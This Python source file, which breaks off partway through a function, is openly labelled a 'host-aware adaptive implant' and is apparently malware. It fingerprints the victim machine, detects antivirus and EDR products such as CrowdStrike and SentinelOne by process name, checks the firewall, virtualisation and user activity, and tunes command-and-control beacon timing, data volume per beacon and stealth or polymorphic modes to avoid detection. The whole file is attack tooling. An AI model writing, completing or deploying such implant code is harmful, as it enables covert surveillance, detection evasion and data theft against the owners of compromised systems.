#!/usr/bin/env python3
"""
HOST-AWARE ADAPTIVE IMPLANT
Features:
1. Environment fingerprinting and profiling
2. Adaptive behavior based on host characteristics
3. Quiet operation modes (low CPU, memory, network)
4. Dynamic persistence selection
5. Security product detection and evasion
6. Network condition awareness
7. Resource optimization
8. Stealth level adjustment
"""

import os
import sys
import json
import time
import platform
import psutil
import socket
import subprocess
import hashlib
import random
import threading
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum

# -------------------------------------------------------------------
# Enums and Data Classes
# -------------------------------------------------------------------
class SecurityLevel(Enum):
    """Security detection levels."""
    LOW = 1        # Home user, no security
    MEDIUM = 2     # Basic AV, firewall
    HIGH = 3       # EDR, advanced monitoring
    PARANOID = 4   # Air-gapped, strict policies

class HostType(Enum):
    """Host type classification."""
    WORKSTATION = 1      # Developer workstation
    SERVER = 2           # Production server
    LAPTOP = 3           # Mobile device
    CONTAINER = 4        # Docker/K8s container
    VM = 5               # Virtual machine
    UNKNOWN = 6

class AdaptiveMode(Enum):
    """Adaptive operation modes."""
    STEALTH = 1          # Maximum stealth, minimal activity
    BALANCED = 2         # Normal operation
    AGGRESSIVE = 3       # Maximum data collection
    DORMANT = 4          # Sleep mode, wake on trigger
    EVASIVE = 5          # Actively evading detection

@dataclass
class AdaptiveConfig:
    """Adaptive configuration based on host profile."""
    mode: AdaptiveMode
    beacon_interval: int
    max_data_per_beacon: int
    use_stealth: bool
    use_polymorphic: bool
    use_dns: bool
    use_mtls: bool
    jitter_enabled: bool
    compression_enabled: bool
    encryption_level: str  # low/medium/high

# -------------------------------------------------------------------
# 1. HOST PROFILER
# -------------------------------------------------------------------
@dataclass
class HostProfile:
    """Comprehensive host profile."""
    # Basic info
    hostname: str
    platform: str
    architecture: str
    username: str
    
    # System characteristics
    cpu_cores: int
    total_memory: int  # MB
    total_disk: int    # GB
    
    # Security assessment
    security_level: SecurityLevel
    security_products: List[str]
    firewall_active: bool
    edr_present: bool
    
    # Network
    network_speed: str  # slow/medium/fast
    is_behind_proxy: bool
    has_internet: bool
    
    # Host type
    host_type: HostType
    is_virtual: bool
    is_container: bool
    
    # Activity patterns
    is_business_hours: bool
    user_active: bool
    system_load: float  # 0-1
    
    # Recommendations
    recommended_mode: AdaptiveMode
    beacon_interval: int  # seconds
    data_limit: int       # bytes per beacon

class HostProfiler:
    """Profile the host environment."""
    
    def __init__(self):
        self.profile = None
        self.last_update = 0
        self.update_interval = 300  # 5 minutes
    
    def profile_host(self) -> HostProfile:
        """Create comprehensive host profile."""
        
        # Basic info
        hostname = socket.gethostname()
        platform_info = platform.system()
        arch = platform.machine()
        username = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
        
        # System characteristics
        cpu_cores = psutil.cpu_count()
        total_memory = psutil.virtual_memory().total // (1024 * 1024)  # MB
        total_disk = psutil.disk_usage('/').total // (1024 * 1024 * 1024)  # GB
        
        # Security assessment
        security_level, security_products = self._assess_security()
        firewall_active = self._check_firewall()
        edr_present = self._check_edr()
        
        # Network assessment
        network_speed = self._assess_network_speed()
        is_behind_proxy = self._check_proxy()
        has_internet = self._check_internet()
        
        # Host type
        host_type, is_virtual, is_container = self._classify_host()
        
        # Activity patterns
        is_business_hours = self._is_business_hours()
        user_active = self._is_user_active()
        system_load = psutil.cpu_percent(interval=0.1) / 100
        
        # Recommendations
        recommended_mode = self._recommend_mode(
            security_level, host_type, system_load
        )
        beacon_interval = self._calculate_beacon_interval(
            security_level, network_speed, system_load
        )
        data_limit = self._calculate_data_limit(
            network_speed, security_level
        )
        
        profile = HostProfile(
            hostname=hostname,
            platform=platform_info,
            architecture=arch,
            username=username,
            cpu_cores=cpu_cores,
            total_memory=total_memory,
            total_disk=total_disk,
            security_level=security_level,
            security_products=security_products,
            firewall_active=firewall_active,
            edr_present=edr_present,
            network_speed=network_speed,
            is_behind_proxy=is_behind_proxy,
            has_internet=has_internet,
            host_type=host_type,
            is_virtual=is_virtual,
            is_container=is_container,
            is_business_hours=is_business_hours,
            user_active=user_active,
            system_load=system_load,
            recommended_mode=recommended_mode,
            beacon_interval=beacon_interval,
            data_limit=data_limit
        )
        
        self.profile = profile
        self.last_update = time.time()
        
        return profile
    
    def _assess_security(self) -> Tuple[SecurityLevel, List[str]]:
        """Assess security posture."""
        products = []
        level = SecurityLevel.LOW
        
        try:
            # Check for common security products
            if platform.system().lower() == 'windows':
                # Windows security checks
                checks = [
                    ('tasklist', ['MsMpEng.exe'], 'Windows Defender'),
                    ('tasklist', ['CSFalconService.exe'], 'CrowdStrike'),
                    ('tasklist', ['SentinelAgent.exe'], 'SentinelOne'),
                    ('tasklist', ['CylanceSvc.exe'], 'Cylance'),
                ]
                
                for cmd, patterns, product in checks:
                    try:
                        result = subprocess.run(
                            [cmd], capture_output=True, text=True, shell=True
                        )
                        output = result.stdout.lower()
                        
                        for pattern in patterns:
                            if pattern.lower() in output:
                                products.append(product)
                                break
                    except:
                        pass
            elif platform.system().lower() == 'linux':
                # Linux security checks
                checks = [
                    ('ps aux', ['clamav'], 'ClamAV'),
                    ('ps aux', ['rkhunter'], 'Rootkit Hunter'),
                ]
                
                for cmd, patterns, product in checks:
                    try:
                        result = subprocess.run(
                            cmd.split(), capture_output=True, text=True
                        )
                        output = result.stdout.lower()
                        
                        for pattern in patterns:
                            if pattern in output:
                                products.append(product)
                                break
                    except:
                        pass
            
            # Determine security level
            if len(products) == 0:
                level = SecurityLevel.LOW
            elif len(products) <= 2:
                level = SecurityLevel.MEDIUM
            else:
                level = SecurityLevel.HIGH
        
        except Exception as e:
            print(f"[!] Security assessment error: {e}")
        
        return level, products
    
    def _check_firewall(self) -> bool:
        """Check if firewall is active."""
        try:
            if platform.system().lower() == 'windows':
                result = subprocess.run(
                    ['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                    capture_output=True, text=True
                )
                return 'ON' in result.stdout
            elif platform.system().lower() == 'linux':
                # Check iptables
                try:
                    subprocess.run(['iptables', '-L'], capture_output=True, check=True)
                    return True
                except:
                    return False
            else:
                return False
        except:
            return False
    
    def _check_edr(self) -> bool:
        """Check for EDR presence."""
        # Check for common EDR processes
        edr_processes = [
            'CSFalconService.exe',  # CrowdStrike
            'SentinelAgent.exe',    # SentinelOne
        ]
        
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in [p.lower() for p in edr_processes]:
                    return True
        except:
            pass
        
        return False
    
    def _assess_network_speed(self) -> str:
        """Assess network speed."""
        try:
            # Simple test: ping Google DNS
            import subprocess
            
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', '1', '8.8.8.8']
            else:
                cmd = ['ping', '-c', '1', '8.8.8.8']
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Check network interface speed
                net_io = psutil.net_io_counters()
                bytes_sent = net_io.bytes_sent
                time.sleep(1)
                net_io = psutil.net_io_counters()
                bytes_per_sec = net_io.bytes_sent - bytes_sent
                
                if bytes_per_sec > 1_000_000:  # 1 MB/s
                    return 'fast'
                elif bytes_per_sec > 100_000:  # 100 KB/s
                    return 'medium'
                else:
                    return 'slow'
            else:
                return 'slow'
        except:
            return 'unknown'
    
    def _check_proxy(self) -> bool:
        """Check if behind proxy."""
        proxy_vars = ['HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy']
        return any(os.getenv(var) for var in proxy_vars)
    
    def _check_internet(self) -> bool:
        """Check internet connectivity."""
        try:
            socket.create_connection(('8.8.8.8', 53), timeout=3)
            return True
        except:
            return False
    
    def _classify_host(self) -> Tuple[HostType, bool, bool]:
        """Classify host type."""
        is_virtual = False
        is_container = False
        host_type = HostType.UNKNOWN
        
        try:
            # Check if virtual (simplified)
            if os.path.exists('/proc/cpuinfo'):
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read()
                    if 'hypervisor' in cpuinfo.lower():
                        is_virtual = True
            
            # Check if container
            if os.path.exists('/.dockerenv'):
                is_container = True
            
            # Determine host type
            if is_container:
                host_type = HostType.CONTAINER
            elif is_virtual:
                host_type = HostType.VM
            else:
                # Guess based on characteristics
                cpu_cores = psutil.cpu_count()
                memory_gb = psutil.virtual_memory().total / (1024**3)
                
                if cpu_cores >= 8 and memory_gb >= 16:
                    host_type = HostType.SERVER
                elif cpu_cores >= 4 and memory_gb >= 8:
                    host_type = HostType.WORKSTATION
                else:
                    host_type = HostType.LAPTOP
        
        except Exception as e:
            print(f"[!] Host classification error: {e}")
        
        return host_type, is_virtual, is_container
    
    def _is_business_hours(self) -> bool:
        """Check if it's business hours."""
        try:
            import datetime
            now = datetime.datetime.now()
            hour = now.hour
            
            # Business hours: 9 AM to 5 PM, Monday to Friday
            if now.weekday() < 5:  # Monday to Friday
                return 9 <= hour < 17
            return False
        except:
            return True  # Assume business hours if can't determine
    
    def _is_user_active(self) -> bool:
        """Check if user is active."""
        try:
            # Simplified: check for user processes
            for proc in psutil.process_iter(['username']):
                if proc.info['username'] == os.getenv('USER'):
                    return True
            return False
        except:
            return False
    
    def _recommend_mode(self, security: SecurityLevel, 
                       host_type: HostType, load: float) -> AdaptiveMode:
        """Recommend adaptive mode."""
        if security == SecurityLevel.HIGH:
            return AdaptiveMode.EVASIVE
        elif load > 0.8:  # High system load
            return AdaptiveMode.DORMANT
        elif host_type == HostType.SERVER:
            return AdaptiveMode.STEALTH
        elif security == SecurityLevel.MEDIUM:
            return AdaptiveMode.BALANCED
        else:
            return AdaptiveMode.AGGRESSIVE
    
    def _calculate_beacon_interval(self, security: SecurityLevel,
                                 network_speed: str, load: float) -> int:
        """Calculate optimal beacon interval."""
        base_interval = 60  # 1 minute
        
        # Adjust for security
        if security == SecurityLevel.HIGH:
            base_interval *= 10  # 10 minutes
        elif security == SecurityLevel.MEDIUM:
            base_interval *= 5   # 5 minutes
        
        # Adjust for network
        if network_speed == 'slow':
            base_interval *= 2
        
        # Adjust for load
        if load > 0.7:
            base_interval *= 3
        
        # Random jitter
        jitter = random.randint(-10, 10)
        
        return max(30, base_interval + jitter)  # Minimum 30 seconds
    
    def _calculate_data_limit(self, network_speed: str, 
                            security: SecurityLevel) -> int:
        """Calculate data limit per beacon."""
        if network_speed == 'fast':
            base_limit = 1024 * 1024  # 1 MB
        elif network_speed == 'medium':
            base_limit = 512 * 1024   # 512 KB
        else:
            base_limit = 100 * 1024   # 100 KB
        
        # Adjust for security
        if security == SecurityLevel.HIGH:
            base_limit //= 10
        elif security == SecurityLevel.MEDIUM:
            base_limit //= 2
        
        return base_limit

# -------------------------------------------------------------------
# 2. ADAPTIVE BEHAVIOR MANAGER
# -------------------------------------------------------------------
class AdaptiveBehaviorManager:
    """Manage adaptive behavior based on host profile."""
    
    def __init__(self, profile: HostProfile):
        self.profile = profile
        self.config = self._generate_adaptive_config()
    
    def _generate_adaptive_config(self) -> AdaptiveConfig:
        """Generate adaptive configuration based on profile."""
        
        # Determine mode
        mode = self.profile.recommended_mode
        
        # Determine feature usage
        use_stealth = self.profile.security_level in [SecurityLevel.MEDIUM, SecurityLevel.HIGH]
        use_polymorphic = self.profile.security_level == SecurityLevel.HIGH
        use_dns = self.profile.network_speed != 'slow' and not self.profile.is_behind_proxy
        use_mtls = self.profile.security_level in [SecurityLevel.MEDIUM, SecurityLevel.HIGH]
        
        # Determine encryption level
        if self.profile.security_level == SecurityLevel.HIGH:
            encryption_level = 'high'
        elif self.profile.security_level == SecurityLevel.MEDIUM:
            encryption_level = 'medium'
        else:
            encryption_level = 'low'
        
        # Determine compression
        compression_enabled = self.profile.network_speed == 'slow'
        
        # Determine jitter
        jitter_enabled = self.profile.security_level != SecurityLevel.LOW
        
        config = AdaptiveConfig(
            mode=mode,
            beacon_interval=self.profile.beacon_interval,
            max_data_per_beacon=self.profile.data_limit,
            use_stealth=use_stealth,
            use_polymorphic=use_polymorphic,
            use_dns=use_dns,
            use_mtls=use_mtls,
            jitter_enabled=jitter_enabled,
            compression_enabled=compression_enabled,
            encryption_level=encryption_level
        )
        
        return config
    
    def get_adaptive_config(self) -> AdaptiveConfig:
        """Get the adaptive configuration."""
        return self.config
    
    def should_beacon_now(self) -> bool:
        """Determine if we should beacon now."""
        # Check system load
        current_load = psutil.cpu_percent(interval=0.1) / 100
        if current_load > 0.9:  # Very high load
            return False
        
        # Check if user is active (for stealth)
        if self.config.mode == AdaptiveMode.STEALTH:
            # Don't beacon when user is very active
            if self.profile.user_active and random.random() > 0.3:
                return False
        
        # Check business hours
        if self.config.mode in [AdaptiveMode.STEALTH, AdaptiveMode.EVASIVE]:
            if self.profile.is_business_hours:
                # Beacon less frequently during